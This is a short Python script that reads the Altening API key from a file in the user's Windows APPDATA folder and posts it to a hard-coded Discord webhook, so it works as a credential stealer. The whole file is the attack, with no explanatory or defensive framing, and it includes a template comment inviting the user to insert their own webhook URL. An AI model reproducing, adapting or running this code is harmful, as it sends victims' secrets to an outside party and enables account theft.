import os
import json
from discord_webhook import DiscordWebhook
from importlib.resources import path


#enter you webhook url here
WEBHOOK_URL = "https://discordapp.com/api/webhooks/790100014982365224/GsCQvSHaC2zqCm-TdNxGmMY5tKla2qkBxztsvZHzHyP_BhhDKRWgeUGLDv73tKQrXZkU"


roaming = os.getenv('APPDATA')
key = roaming + '\\altening\\data.json'
if os.path.exists(key):
    with open(key) as c:
        json = json.load(c)
    API = json.get("Api_Key")
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**API** ```\n{API}```"))
    response = f.execute()
else:
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**API** ```\nAPI not found.```"))
    response = f.execute()


